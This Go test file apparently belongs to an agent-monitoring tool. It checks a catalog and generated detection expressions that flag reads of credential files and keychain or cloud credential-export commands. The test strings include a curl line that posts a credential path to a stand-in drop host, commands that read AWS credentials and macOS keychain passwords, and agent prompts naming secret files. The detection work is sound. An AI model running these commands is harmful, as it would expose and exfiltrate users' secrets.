package concepts

import (
	"path/filepath"
	"reflect"
	"regexp"
	"runtime"
	"slices"
	"strings"
	"testing"

	"github.com/asymptote-labs/agent-beacon/pkg/asymptoteobserve"
)

const smallCatalog = `
catalog: credential-stores
version: 1
predicates:
  path: credential_path
  command: credential_command
kinds:
  - {id: cloud, title: Cloud}
  - {id: dotenv, title: Environment files}
  - {id: generic, title: Generic}
  - {id: keychain, title: Keychains}
stores:
  - id: aws
    title: AWS shared credentials
    kind: cloud
    tier: definite
    match: [".aws/credentials"]
    examples: ["/home/u/.aws/credentials"]
    counterexamples: ["/home/u/.aws/config"]
  - id: dotenv-variant
    title: Environment file for one environment
    kind: dotenv
    tier: likely
    match: [".env.*"]
    exclude: [".env.example"]
    examples: ["/repo/.env.local"]
    counterexamples: ["/repo/.env.example"]
  - id: credentials-file
    title: A file named credentials
    kind: generic
    tier: likely
    match: ["credentials", "credentials.json"]
    examples: ["/srv/credentials", "/srv/credentials.json"]
  - id: aws-export
    title: AWS credentials exported by the CLI
    kind: cloud
    tier: definite
    commands:
      - {name: aws, words: [configure, export-credentials]}
    examples: ["aws configure export-credentials"]
    counterexamples: ["aws configure list"]
  - id: macos-keychain
    title: macOS keychain password
    kind: keychain
    tier: definite
    commands:
      - {name: security, words: ["find-{generic,internet}-password"], flags: [w, g]}
    examples: ["security find-generic-password -s GitHub -w"]
    counterexamples: ["security find-generic-password -s GitHub"]
  - id: keychain-listing
    title: macOS keychain items listed
    kind: keychain
    tier: likely
    commands:
      - {name: security, flags: ["--list*"]}
      - {name: "secret-tool{,.exe}"}
    examples: ["security --list-all", "secret-tool search x y"]
`

func TestLookupPrefersTheSurerStore(t *testing.T) {
	c, err := Decode([]byte(smallCatalog))
	if err != nil {
		t.Fatal(err)
	}
	for path, want := range map[string]string{
		"/home/u/.aws/credentials": "aws", // credentials-file matches it too
		"/srv/app/credentials":     "credentials-file",
		"/repo/.env.production":    "dotenv-variant",
		"/repo/.env.example":       "",
		"/repo/README.md":          "",
		"aws":                      "", // a command store is no file
	} {
		got := ""
		if s, ok := c.Lookup(path); ok {
			got = s.ID
		}
		if got != want {
			t.Errorf("Lookup(%q) = %q, want %q", path, got, want)
		}
	}
}

// A command is matched by its name, by words that follow each other after it, and by an option
// of which one must be there.
func TestLookupCommand(t *testing.T) {
	c, err := Decode([]byte(smallCatalog))
	if err != nil {
		t.Fatal(err)
	}
	for command, want := range map[string]string{
		"aws configure export-credentials":                 "aws-export",
		"aws --profile prod configure export-credentials":  "aws-export",
		"AWS Configure Export-Credentials --format env":    "aws-export",
		"aws configure list export-credentials":            "", // the words do not follow each other
		"aws export-credentials configure":                 "",
		"aws configure export-credentials-now":             "",
		"awsx configure export-credentials":                "",
		"security find-generic-password -s GitHub -w":      "macos-keychain",
		"security find-internet-password -g -s github.com": "macos-keychain",
		"security find-generic-password -aw me":            "macos-keychain", // w in a cluster
		"security -w find-generic-password":                "macos-keychain", // anywhere after the name
		"security find-generic-password -s GitHub":         "",
		"security find-generic-password -s GitHub -W":      "", // a short option keeps its case
		"security find-generic-password -s GitHub --w":     "",
		"security find-generic-password -s w":              "",
		"security find-generic-password -s x-w":            "",
		"security find-certificate -w":                     "",
		"security --list-all":                              "keychain-listing",
		"security --LIST=all":                              "keychain-listing", // an option word, with a value
		"security --lis":                                   "",
		"security list --x=--list":                         "",
		"security --list-all find-generic-password -g":     "macos-keychain", // the definite store first
		"secret-tool":                "keychain-listing",
		"secret-tool.exe lookup a b": "keychain-listing",
		"secret-tools":               "",
	} {
		words := strings.Fields(command)
		got := ""
		if s, ok := c.LookupCommand(words[0], words[1:]); ok {
			got = s.ID
		}
		if got != want {
			t.Errorf("LookupCommand(%q) = %q, want %q", command, got, want)
		}
	}
}

// A selection is the stores of a tier and kind, and its renderings carry the same expressions. A
// store that excludes paths keeps its exclusion to itself.
func TestSelect(t *testing.T) {
	c, err := Decode([]byte(smallCatalog))
	if err != nil {
		t.Fatal(err)
	}
	const (
		aws     = `(?i)(?:^|[/\\])(?:\.aws[/\\]credentials$)`
		generic = `(?i)(?:^|[/\\])(?:credentials$|credentials\.json$)`
		both    = `(?i)(?:^|[/\\])(?:\.aws[/\\]credentials$|credentials$|credentials\.json$)`
		variant = `(?i)(?:^|[/\\])(?:\.env\.[^/\\]*$)`
		example = `(?i)(?:^|[/\\])(?:\.env\.example$)`
	)
	var (
		export   = CommandTerm{Name: `(?i)^aws$`, Words: `(?im)^configure\nexport-credentials$`}
		keychain = CommandTerm{Name: `(?i)^security$`, Words: `(?im)^find-(?:generic|internet)-password$`, Flags: `(?m)^(?:-[A-Za-z0-9]*[wg][A-Za-z0-9]*)$`}
		listing  = CommandTerm{Name: `(?i)^security$`, Flags: `(?m)^(?:(?i:--list[^\n]*)(?:=[^\n]*)?)$`}
		tool     = CommandTerm{Name: `(?i)^secret-tool(?:|\.exe)$`}
	)
	for _, tc := range []struct {
		tier  Tier
		kinds []string
		want  Selection
	}{
		{TierDefinite, nil, Selection{Paths: []PathTerm{{Include: aws}}, Commands: []CommandTerm{export, keychain}}},
		{TierLikely, nil, Selection{Paths: []PathTerm{{Include: both}, {Include: variant, Exclude: example}}, Commands: []CommandTerm{export, keychain, listing, tool}}},
		{TierLikely, []string{"generic"}, Selection{Paths: []PathTerm{{Include: generic}}}},
		{TierLikely, []string{"dotenv", "cloud"}, Selection{Paths: []PathTerm{{Include: aws}, {Include: variant, Exclude: example}}, Commands: []CommandTerm{export}}},
		{TierDefinite, []string{"keychain"}, Selection{Commands: []CommandTerm{keychain}}},
		{TierDefinite, []string{"dotenv"}, Selection{}},
	} {
		got, err := c.Select(tc.tier, tc.kinds...)
		// The mentions are the paths bounded for a text; their own tests are below.
		if len(got.Mentions) != len(got.Paths) {
			t.Errorf("Select(%s, %q): %d mentions for %d paths", tc.tier, tc.kinds, len(got.Mentions), len(got.Paths))
		}
		// The mentions are the paths bounded for a text, and the redacted expression the
		// commands as a log holds them; their own tests are below.
		got.Mentions, got.Redacted = nil, ""
		if err != nil || !reflect.DeepEqual(got, tc.want) {
			t.Errorf("Select(%s, %q) =\n%q, %v; want\n%q", tc.tier, tc.kinds, got, err, tc.want)
		}
	}
	if _, err := c.Select(TierLikely, "kubernetes"); err == nil {
		t.Error("Select with a kind the catalog does not have: want an error")
	}
	if _, err := c.Select("certain"); err == nil {
		t.Error("Select with an unknown tier: want an error")
	}

	all, _ := c.Select(TierLikely)
	if got, want := all.PathCEL("e.file.path"), `(e.file.path.matches("(?i)(?:^|[/\\\\])(?:\\.aws[/\\\\]credentials$|credentials$|credentials\\.json$)") || `+
		`(e.file.path.matches("(?i)(?:^|[/\\\\])(?:\\.env\\.[^/\\\\]*$)") && !e.file.path.matches("(?i)(?:^|[/\\\\])(?:\\.env\\.example$)")))`; got != want {
		t.Errorf("PathCEL =\n%s\nwant\n%s", got, want)
	}
	if got, want := all.PathKQL("FilePath"), `(FilePath matches regex @"`+both+`" or (FilePath matches regex @"`+variant+`" and not(FilePath matches regex @"`+example+`")))`; got != want {
		t.Errorf("PathKQL =\n%s\nwant\n%s", got, want)
	}
	if got, want := all.CommandCEL("c"), `(c.name.matches("(?i)^(?:aws|security|secret-tool(?:|\\.exe))$") && `+
		`((c.name.matches("(?i)^aws$") && c.args.matches("(?im)^configure\\nexport-credentials$")) || `+
		`(c.name.matches("(?i)^security$") && c.args.matches("(?im)^find-(?:generic|internet)-password$") && c.args.matches("(?m)^(?:-[A-Za-z0-9]*[wg][A-Za-z0-9]*)$")) || `+
		`(c.name.matches("(?i)^security$") && c.args.matches("(?m)^(?:(?i:--list[^\\n]*)(?:=[^\\n]*)?)$")) || `+
		`c.name.matches("(?i)^secret-tool(?:|\\.exe)$")))`; got != want {
		t.Errorf("CommandCEL =\n%s\nwant\n%s", got, want)
	}
	if got, want := all.MentionCEL("s"), `(s.matches("(?i)(?:(?:^|[^\\w.~%+-])(?:\\.aws[/\\\\]credentials\\.?(?:$|[^\\w.~%+/\\\\-])|credentials\\.json\\.?(?:$|[^\\w.~%+/\\\\-]))|[/\\\\](?:credentials\\.?(?:$|[^\\w.~%+/\\\\-])))") || `+
		`(s.matches("(?i)(?:(?:^|[^\\w.~%+-])(?:\\.env\\.[\\w.~%+-]*\\.?(?:$|[^\\w.~%+/\\\\-])))") && !s.matches("(?i)(?:(?:^|[^\\w.~%+-])(?:\\.env\\.example\\.?(?:$|[^\\w.~%+/\\\\-])))")))`; got != want {
		t.Errorf("MentionCEL =\n%s\nwant\n%s", got, want)
	}
	definite, _ := c.Select(TierDefinite)
	if got, want := definite.PathKQL("FilePath"), `FilePath matches regex @"`+aws+`"`; got != want {
		t.Errorf("PathKQL = %s, want %s", got, want)
	}
	none, _ := c.Select(TierDefinite, "dotenv")
	if none.PathCEL("p") != "false" || none.PathKQL("p") != "false" || none.CommandCEL("c") != "false" || none.MentionCEL("s") != "false" {
		t.Errorf("an empty selection = %q, %q, %q, %q; want false", none.PathCEL("p"), none.PathKQL("p"), none.CommandCEL("c"), none.MentionCEL("s"))
	}
}

// Decode refuses a catalog whose shape or patterns are wrong, and Check one whose examples
// disagree with its patterns: a catalog that passes both means what its examples say.
func TestDecodeAndCheckRefuse(t *testing.T) {
	if c, err := Decode([]byte(smallCatalog)); err != nil || c.Check() != nil {
		t.Fatalf("the catalog the cases change does not pass itself: %v", err)
	}
	for name, tc := range map[string]struct {
		old, new string
		want     string
	}{
		"unknown field":                  {"tier: definite", "tier: definite\n    severity: high", "field severity not found"},
		"unknown tier":                   {"tier: definite", "tier: certain", `tier "certain"`},
		"undeclared kind":                {"kind: cloud\n", "kind: clouds\n", `kind "clouds" is not one of the catalog's kinds`},
		"duplicate store":                {"id: dotenv-variant", "id: aws", "store aws: defined twice"},
		"duplicate kind":                 {"{id: dotenv, title: Environment files}", "{id: cloud, title: Again}", `kind "cloud"`},
		"bad id":                         {"id: aws", "id: AWS", `id "AWS"`},
		"no title":                       {"    title: AWS shared credentials\n", "", "store aws: no title"},
		"no patterns":                    {`match: [".aws/credentials"]`, "match: []", "store aws: no match patterns and no commands"},
		"bad pattern":                    {`match: [".aws/credentials"]`, `match: ["/.aws/credentials"]`, "store aws: match: pattern"},
		"bad exclude pattern":            {`exclude: [".env.example"]`, `exclude: [".env.[e]xample"]`, "store dotenv-variant: exclude: pattern"},
		"pattern listed twice":           {`match: ["credentials", "credentials.json"]`, `match: ["credentials", "credentials"]`, "listed twice"},
		"example not matched":            {`examples: ["/home/u/.aws/credentials"]`, `examples: ["/home/u/.aws/config"]`, `store aws: example "/home/u/.aws/config": not matched`},
		"example excluded":               {`examples: ["/repo/.env.local"]`, `examples: ["/repo/.env.example"]`, `store dotenv-variant: example "/repo/.env.example": not matched`},
		"example is another store":       {`examples: ["/srv/credentials", "/srv/credentials.json"]`, `examples: ["/srv/.aws/credentials", "/srv/credentials.json"]`, `store credentials-file: example "/srv/.aws/credentials": is store aws`},
		"pattern without an example":     {`examples: ["/srv/credentials", "/srv/credentials.json"]`, `examples: ["/srv/credentials"]`, `store credentials-file: match pattern "credentials.json": no example shows it`},
		"counterexample is a store":      {`counterexamples: ["/home/u/.aws/config"]`, `counterexamples: ["/home/u/credentials"]`, `store aws: counterexample "/home/u/credentials": is store credentials-file`},
		"exclude without counterexample": {`counterexamples: ["/repo/.env.example"]`, `counterexamples: ["/repo/README.md"]`, `store dotenv-variant: exclude pattern ".env.example": no counterexample shows it`},
		"no stores":                      {smallCatalog[strings.Index(smallCatalog, "stores:"):], "stores: []\n", "no stores"},
		"bad version":                    {"version: 1", "version: 0", "version 0"},
		"bad name":                       {"catalog: credential-stores", "catalog: Credential Stores", `catalog "Credential Stores"`},
		"bad predicate name":             {"path: credential_path", "path: Credential-Path", `predicates.path "Credential-Path"`},
		"predicates named alike":         {"command: credential_command", "command: credential_path", `path and command are both "credential_path"`},
		"predicate for no store":         {smallCatalog[strings.Index(smallCatalog, "  - id: aws-export"):], "", `predicates.command "credential_command": the catalog has no store it would be about`},
		"name is not a string":           {"catalog: credential-stores", "catalog: [a]", "cannot unmarshal"},

		"paths and commands":              {"      - {name: aws, words: [configure, export-credentials]}\n", "      - {name: aws, words: [configure, export-credentials]}\n    match: [\".aws/x\"]\n", "store aws-export: both paths and commands"},
		"command without a name":          {"{name: aws, words: [configure, export-credentials]}", "{words: [configure, export-credentials]}", "store aws-export: commands[0]: name: empty pattern"},
		"bad command name":                {"{name: aws, words: [configure, export-credentials]}", "{name: \"aws[2]\"}", "store aws-export: commands[0]: name: pattern"},
		"bad word":                        {"words: [configure, export-credentials]", "words: [configure, \"export-{credentials\"]", "store aws-export: commands[0]: words: pattern"},
		"flag that is no option":          {"flags: [w, g]", "flags: [w, generic]", `store macos-keychain: commands[0]: flags: "generic": want one letter`},
		"flag listed twice":               {"flags: [w, g]", "flags: [w, w]", `flags: "w" listed twice`},
		"unknown command field":           {"{name: aws, words: [configure, export-credentials]}", "{name: aws, subcommand: configure}", "field subcommand not found"},
		"command example not matched":     {`examples: ["aws configure export-credentials"]`, `examples: ["aws configure list"]`, `store aws-export: example "aws configure list": not matched`},
		"command example does not parse":  {`examples: ["aws configure export-credentials"]`, `examples: ["aws configure 'export-credentials"]`, `store aws-export: example "aws configure 'export-credentials"`},
		"command example is another":      {`examples: ["security --list-all", "secret-tool search x y"]`, `examples: ["security --list-all find-generic-password -w", "secret-tool search x y"]`, `store keychain-listing: example "security --list-all find-generic-password -w": is store macos-keychain`},
		"command without an example":      {`examples: ["security --list-all", "secret-tool search x y"]`, `examples: ["security --list-all"]`, `store keychain-listing: commands[1] (secret-tool{,.exe}): no example shows it`},
		"command counterexample is one":   {`counterexamples: ["aws configure list"]`, `counterexamples: ["echo $(security find-generic-password -w)"]`, `store aws-export: counterexample "echo $(security find-generic-password -w)": is store macos-keychain`},
		"path example for a command":      {`examples: ["security find-generic-password -s GitHub -w"]`, `examples: ["/home/u/Library/Keychains/login.keychain-db"]`, "not matched"},
		"command counterexample no parse": {`counterexamples: ["security find-generic-password -s GitHub"]`, `counterexamples: ["security 'x"]`, `store macos-keychain: counterexample "security 'x"`},
	} {
		if !strings.Contains(smallCatalog, tc.old) {
			t.Fatalf("%s: the catalog does not contain %q", name, tc.old)
		}
		c, err := Decode([]byte(strings.Replace(smallCatalog, tc.old, tc.new, 1)))
		if err == nil {
			err = c.Check()
		}
		if err == nil || !strings.Contains(err.Error(), tc.want) {
			t.Errorf("%s: Decode and Check = %v, want an error about %q", name, err, tc.want)
		}
	}
}

// credentialStores loads the catalog the rule pack ships.
func credentialStores(t *testing.T) *Catalog {
	t.Helper()
	_, thisFile, _, ok := runtime.Caller(0)
	if !ok {
		t.Fatal("runtime.Caller failed")
	}
	c, err := Load(filepath.Join(filepath.Dir(thisFile), "..", "..", "..", "rules", "concepts", "credential-stores.catalog.yaml"))
	if err == nil {
		err = c.Check()
	}
	if err != nil {
		t.Fatal(err)
	}
	return c
}

// selections are the selections a rule can ask for by kind: every kind, and each one.
func selections(c *Catalog) [][]string {
	all := [][]string{nil}
	for _, k := range c.Kinds {
		all = append(all, []string{k.ID})
	}
	return all
}

// inSelection reports whether a store is one a selection takes.
func inSelection(s *Store, tier Tier, kinds []string) bool {
	return tier.includes(s.Tier) && (kinds == nil || kinds[0] == s.Kind)
}

// pathVariants are paths near path: the ones a careless pattern or expression gets wrong.
func pathVariants(path string) []string {
	base := path[strings.LastIndexAny(path, `/\`)+1:]
	dir := path[:len(path)-len(base)]
	return []string{
		path,
		"/mnt/backup" + "/" + strings.TrimLeft(path, `/~`),
		strings.ReplaceAll(path, "/", `\`),
		strings.ReplaceAll(path, `\`, "/"),
		strings.ToUpper(path),
		strings.ToLower(path),
		path + ".bak",
		path + "~",
		path + "/",
		path + "/child",
		dir + "x" + base,
		dir + base + "x",
		dir + "sub/" + base,
		strings.Replace(path, "/", "//", 1),
		strings.Replace(path, ".", "x", 1),
		strings.TrimLeft(base, "."),
		base,
		"docs/" + base + ".md",
	}
}

// TestCredentialStoresPathExpressionsAgree is the conformance check of the expressions generated
// for files: for every selection a rule can ask for, the regular expressions accept exactly the
// paths the catalog's own matcher does, over every example and counterexample and the paths near
// them.
func TestCredentialStoresPathExpressionsAgree(t *testing.T) {
	c := credentialStores(t)
	var paths []string
	for _, s := range c.Stores {
		if len(s.Commands) > 0 {
			continue
		}
		for _, p := range slices.Concat(s.Examples, s.Counterexamples) {
			paths = append(paths, pathVariants(p)...)
		}
	}
	accepted, asked := 0, 0
	for _, tier := range []Tier{TierDefinite, TierLikely} {
		for _, kinds := range selections(c) {
			selection, err := c.Select(tier, kinds...)
			if err != nil {
				t.Fatal(err)
			}
			type compiled struct{ include, exclude *regexp.Regexp }
			terms := make([]compiled, len(selection.Paths))
			for i, term := range selection.Paths {
				terms[i].include = regexp.MustCompile(term.Include)
				if term.Exclude != "" {
					terms[i].exclude = regexp.MustCompile(term.Exclude)
				}
			}
			for _, path := range paths {
				want := false
				comps := splitPath(path)
				for i := range c.Stores {
					if s := &c.Stores[i]; inSelection(s, tier, kinds) && s.matchesComponents(comps) {
						want = true
					}
				}
				got := false
				for _, term := range terms {
					if term.include.MatchString(path) && (term.exclude == nil || !term.exclude.MatchString(path)) {
						got = true
					}
				}
				if got != want {
					t.Errorf("%s stores of kinds %q: the expression says %v for %q, the catalog %v", tier, kinds, got, path, want)
				}
				asked++
				if got {
					accepted++
				}
			}
		}
	}
	// The check is of little worth if the paths near the examples were all rejected, or all taken.
	t.Logf("%d paths: %d of %d answers were yes", len(paths), accepted, asked)
	if accepted == 0 || accepted == asked {
		t.Errorf("%d of %d answers were yes: the variants do not exercise the expressions", accepted, asked)
	}
}

// mentioned reports whether text mentions a selection, as the generated expression decides it.
func mentioned(selection Selection, text string) bool {
	for _, term := range selection.Mentions {
		if compiledOnce(term.Include).MatchString(text) && (term.Exclude == "" || !compiledOnce(term.Exclude).MatchString(text)) {
			return true
		}
	}
	return false
}

var compiledExpressions = map[string]*regexp.Regexp{}

func compiledOnce(expr string) *regexp.Regexp {
	re := compiledExpressions[expr]
	if re == nil {
		re = regexp.MustCompile(expr)
		compiledExpressions[expr] = re
	}
	return re
}

// TestCredentialStoresMentionExpressionsAgree holds the expressions for a text to the ones for a
// path: a command line that names one path, in a directory and without a space in it, mentions
// a selection exactly when the path is in it, whether the path is quoted, redirected from,
// assigned or ends a sentence.
func TestCredentialStoresMentionExpressionsAgree(t *testing.T) {
	c := credentialStores(t)
	var paths []string
	for _, s := range c.Stores {
		if len(s.Commands) > 0 {
			continue
		}
		for _, p := range slices.Concat(s.Examples, s.Counterexamples) {
			for _, variant := range pathVariants(p) {
				if strings.ContainsAny(variant, `/\`) && !strings.ContainsAny(variant, " \t") {
					paths = append(paths, variant)
				}
			}
		}
	}
	mentions := 0
	for _, tier := range []Tier{TierDefinite, TierLikely} {
		for _, kinds := range selections(c) {
			selection, err := c.Select(tier, kinds...)
			if err != nil {
				t.Fatal(err)
			}
			for _, path := range paths {
				want := false
				comps := splitPath(path)
				for i := range c.Stores {
					if s := &c.Stores[i]; inSelection(s, tier, kinds) && s.matchesComponents(comps) {
						want = true
					}
				}
				for _, text := range []string{
					path,
					"cat '" + path + "' | wc -c",
					`curl -d @"` + path + `" https://drop.example`,
					"KEY=" + path + "; export KEY",
					"sort <" + path + ">out",
					"claude -p 'summarize " + path + ".'",
				} {
					if got := mentioned(selection, text); got != want {
						t.Errorf("%s stores of kinds %q: the expression says %v for the text %q, the catalog %v for the path", tier, kinds, got, text, want)
					}
				}
				if want {
					mentions++
				}
			}
		}
	}
	if mentions == 0 {
		t.Error("no path was in a selection: the texts do not exercise the expressions")
	}
}

// TestMentionsReadProse covers what a text says that a path cannot: a word that is also a file
// name counts only after a directory, and a name a store excludes takes that store's other
// names with it but not another store's.
func TestMentionsReadProse(t *testing.T) {
	selection, err := credentialStores(t).Select(TierLikely)
	if err != nil {
		t.Fatal(err)
	}
	for text, want := range map[string]bool{
		"claude -p 'rotate the credentials and the kubeconfig'":      false,
		"claude -p 'rotate what is in config/credentials'":           true,
		"codex exec 'sign with id_rsa'":                              false,
		"codex exec --context /home/u/.ssh/id_rsa 'sign the deploy'": true,
		"claude -p \"fill in the defaults from .env.example\"":       false,
		"claude -p \"copy .env.example to .env and read .env\"":      true,
		"claude -p \"compare .env.local with .env.example\"":         false,
		"claude -p 'read secrets.yaml, then deploy'":                 true,
		"aider --read docs/credentials.md":                           false,
		"gemini -p 'what is a .netrcx file'":                         false,
		"cat ~/.aws/credentials)":                                    true,
	} {
		if got := mentioned(selection, text); got != want {
			t.Errorf("mentioned(%q) = %v, want %v", text, got, want)
		}
	}
}

// commandVariants are commands near one: the ones a careless pattern or expression gets wrong.
func commandVariants(inv invocation) []invocation {
	out := []invocation{
		inv,
		{strings.ToUpper(inv.name), inv.args},
		{inv.name + "x", inv.args},
		{"x" + inv.name, inv.args},
		{inv.name, nil},
		{inv.name, []string{strings.Join(inv.args, " ")}}, // the words as one quoted word
	}
	reversed := slices.Clone(inv.args)
	slices.Reverse(reversed)
	out = append(out, invocation{inv.name, reversed})
	for i, arg := range inv.args {
		without := slices.Delete(slices.Clone(inv.args), i, i+1)
		changed := func(to string) []string {
			args := slices.Clone(inv.args)
			args[i] = to
			return args
		}
		out = append(out,
			invocation{inv.name, without},
			invocation{inv.name, slices.Insert(slices.Clone(inv.args), i, "--other")},
			invocation{inv.name, slices.Insert(slices.Clone(inv.args), i, "")}, // a word of unknown value
			invocation{inv.name, changed(strings.ToUpper(arg))},
			invocation{inv.name, changed(arg + "x")},
			invocation{inv.name, changed("x" + arg)},
			invocation{inv.name, changed(arg + "=value")},
			invocation{inv.name, changed("-" + arg)},
			invocation{inv.name, changed(strings.TrimLeft(arg, "-"))},
			invocation{inv.name, changed(arg + " " + arg)},
		)
	}
	return out
}

// TestCredentialStoresCommandExpressionsAgree is the same check for commands: the expressions
// over a command's name and its arguments as text accept exactly the commands the catalog's own
// matcher does, over the commands of every example and counterexample and the ones near them.
func TestCredentialStoresCommandExpressionsAgree(t *testing.T) {
	c := credentialStores(t)
	var commands []invocation
	for _, s := range c.Stores {
		if len(s.Commands) == 0 {
			continue
		}
		for _, line := range slices.Concat(s.Examples, s.Counterexamples) {
			parsed, err := invocations(line)
			if err != nil {
				t.Fatal(err)
			}
			for _, inv := range parsed {
				commands = append(commands, commandVariants(inv)...)
			}
		}
	}
	accepted, asked := 0, 0
	for _, tier := range []Tier{TierDefinite, TierLikely} {
		for _, kinds := range selections(c) {
			selection, err := c.Select(tier, kinds...)
			if err != nil {
				t.Fatal(err)
			}
			type compiled struct{ name, words, flags *regexp.Regexp }
			terms := make([]compiled, len(selection.Commands))
			for i, term := range selection.Commands {
				terms[i].name = regexp.MustCompile(term.Name)
				if term.Words != "" {
					terms[i].words = regexp.MustCompile(term.Words)
				}
				if term.Flags != "" {
					terms[i].flags = regexp.MustCompile(term.Flags)
				}
			}
			for _, inv := range commands {
				want := false
				for i := range c.Stores {
					if s := &c.Stores[i]; inSelection(s, tier, kinds) && s.matchesCommand(inv.name, inv.args) {
						want = true
					}
				}
				// The arguments as a rule reads them: one word per line.
				text := strings.Join(inv.args, "\n")
				got := false
				for _, term := range terms {
					if term.name.MatchString(inv.name) && (term.words == nil || term.words.MatchString(text)) && (term.flags == nil || term.flags.MatchString(text)) {
						got = true
					}
				}
				if got != want {
					t.Errorf("%s stores of kinds %q: the expression says %v for %s %q, the catalog %v", tier, kinds, got, inv.name, inv.args, want)
				}
				asked++
				if got {
					accepted++
				}
			}
		}
	}
	t.Logf("%d commands: %d of %d answers were yes", len(commands), accepted, asked)
	if accepted == 0 || accepted == asked {
		t.Errorf("%d of %d answers were yes: the variants do not exercise the expressions", accepted, asked)
	}
}

// Every kind the catalog declares has a store, and the definite tier is not empty: a selection a
// rule asks for by kind or tier is never silently nothing.
func TestCredentialStoresKindsAndTiersAreUsed(t *testing.T) {
	c := credentialStores(t)
	for _, k := range c.Kinds {
		selection, err := c.Select(TierLikely, k.ID)
		if err != nil || len(selection.Paths)+len(selection.Commands) == 0 {
			t.Errorf("kind %s: no store (%v)", k.ID, err)
		}
	}
	if selection, _ := c.Select(TierDefinite); len(selection.Paths) == 0 || len(selection.Commands) == 0 {
		t.Error("no definite store of files, or none of commands")
	}
}

// TestCredentialStoresRedactedExpression holds the expression for a redacted command line to
// what a log holds. Redaction used to replace a command's name where the command's output is put
// right after a secret's label: after the colon of curl's -u, and, in the logs a Beacon wrote
// before redaction kept the opening of a command substitution, in an assignment to TOKEN and in a
// bearer header. What those logs keep is still found when the match has words to tell the command
// by. No counterexample is. The sanitizer now keeps the substitution whole in all three, so a log
// it writes names the command.
func TestCredentialStoresRedactedExpression(t *testing.T) {
	c := credentialStores(t)
	all, err := c.Select(TierLikely)
	if err != nil || all.Redacted == "" {
		t.Fatalf("no redacted expression: %v", err)
	}
	expression := regexp.MustCompile(all.Redacted)
	// logged returns what older logs hold of a command line that runs command, whose name is
	// name, for its output. It first checks that the sanitizer now keeps the command.
	logged := func(command, name string) []string {
		rest := strings.TrimPrefix(command, name)
		for _, line := range []string{
			`curl -u "deploy:$(` + command + `)" https://api.example`,
			`TOKEN=$(` + command + `)`,
			`curl -H "Authorization: Bearer $(` + command + `)" https://api.example`,
		} {
			event := asymptoteobserve.SanitizeEvent(asymptoteobserve.Event{Command: &asymptoteobserve.CommandInfo{Command: line}}, 64*1024)
			if got := event.Command.Command; !strings.Contains(got, "$("+name+" ") {
				t.Errorf("the sanitizer took the name of %q from %q: %q", name, line, got)
			}
		}
		return []string{
			`curl -u "deploy:[REDACTED]` + rest + `)" https://api.example`,
			"TOKEN=[REDACTED]" + rest + ")",
			`curl -H "Authorization: Bearer [REDACTED]` + rest + `)" https://api.example`,
		}
	}
	// alone returns the one command a line runs when the line is that command and no more.
	alone := func(line string) (invocation, bool) {
		invs, err := invocations(line)
		if err != nil || len(invs) != 1 || !strings.HasPrefix(line, invs[0].name+" ") {
			return invocation{}, false
		}
		return invs[0], true
	}
	found, refused := 0, 0
	for i := range c.Stores {
		s := &c.Stores[i]
		if len(s.commands) == 0 {
			continue
		}
		for _, example := range s.Examples {
			inv, ok := alone(example)
			// A match with words that has a redacted form must be found. One with options alone
			// is found only when the example writes an option in full, which this does not ask.
			if !ok || !slices.ContainsFunc(s.commands, func(p commandPattern) bool {
				return len(p.words) > 0 && p.redactedRegex() != "" && p.matches(inv.name, inv.args)
			}) {
				continue
			}
			for _, text := range logged(example, inv.name) {
				if strings.Contains(text, inv.name+" ") {
					t.Fatalf("%s: redaction kept the name in %q, so the texts do not exercise the expression", s.ID, text)
				}
				if !expression.MatchString(text) {
					t.Errorf("%s: the expression does not find %q, which is what a log holds of %q", s.ID, text, example)
				}
				found++
			}
		}
		for _, counter := range s.Counterexamples {
			inv, ok := alone(counter)
			if _, read := c.LookupCommand(inv.name, inv.args); !ok || read {
				continue
			}
			for _, text := range logged(counter, inv.name) {
				if expression.MatchString(text) {
					t.Errorf("%s: the expression finds %q, which is what a log holds of the counterexample %q", s.ID, text, counter)
				}
				refused++
			}
		}
	}
	if found == 0 || refused == 0 {
		t.Errorf("%d examples found and %d counterexamples refused: the texts do not exercise the expression", found, refused)
	}
}

// A regular expression copies the catalog when it spells out stores by name. One that says a
// word the stores also use, or names one store for a reason of its own, does not.
func TestNamedTellsACopyFromAWord(t *testing.T) {
	c := credentialStores(t)
	for expression, want := range map[string][]string{
		// The list a Sentinel query carried before it was generated from the catalog.
		`(?i)(^|/)(\.env|id_rsa|credentials|secrets?|\.npmrc|\.pypirc|kubeconfig)(\.|$|/)`: {"ssh-private-key", "dotenv", "npmrc", "pypirc"},
		`(?i)(^|[/\\])(?:\.aws[/\\]credentials$|\.netrc$)`:                                 {"aws-shared-credentials", "netrc"},
		`(?i)\b(gh\s+auth\s+token|aws\s+configure\s+export-credentials)\b`:                 {"github-cli-token", "aws-credential-export"},
		`(?i)\bgpg2?\b[^;&|]*--export-secret-(k|sub)\w*\b`:                                 {"gpg-secret-key-export"},
		`(?i)(TOKEN|SECRET|PASSWORD|API[_-]?KEY|credentials?)`:                             nil,
		`(?i)\b(env|printenv|set)\b`:                                                       nil,
		`(?i)\b(security|gcloud|kubectl|vault)\s+(list|get|delete)\b`:                      nil,
		`(?i)(curl|wget)\b.*\.csv$`:                                                        nil,
	} {
		if got := c.Named(expression); !slices.Equal(got, want) {
			t.Errorf("Named(%s) = %q, want %q", expression, got, want)
		}
	}
}

// A candidate is a file that is read, named like a credential's and in no store: what the
// catalog's reviewers have not seen. A store, source code, documentation and a template are not.
func TestCandidatesAreCredentialLikeFilesTheCatalogLacks(t *testing.T) {
	c := credentialStores(t)
	got := c.Candidates([]string{
		"/srv/app/config/master.key",
		"/home/u/work/client_secret.json",
		"/home/u/other/client_secret.json",
		"/home/u/work/client_secret.json", // the same path again
		"/home/u/.config/app/auth-token:1-20",
		"/home/u/.aws/credentials",       // a store
		"/repo/.env",                     // a store
		"/repo/src/auth/credentials.go",  // source code
		"/repo/docs/token-usage.mdx:26",  // documentation, with a line selector
		"/repo/config/secrets.yaml.tmpl", // a template
		"/repo/rules/x/credentials-in-curl-data.rule.yaml",
		"/repo/README.md",
	})
	want := []Candidate{
		{Name: "client_secret.json", Reads: 2, Example: "/home/u/work/client_secret.json"},
		{Name: "auth-token", Reads: 1, Example: "/home/u/.config/app/auth-token"},
		{Name: "master.key", Reads: 1, Example: "/srv/app/config/master.key"},
	}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("Candidates =\n%+v\nwant\n%+v", got, want)
	}
}
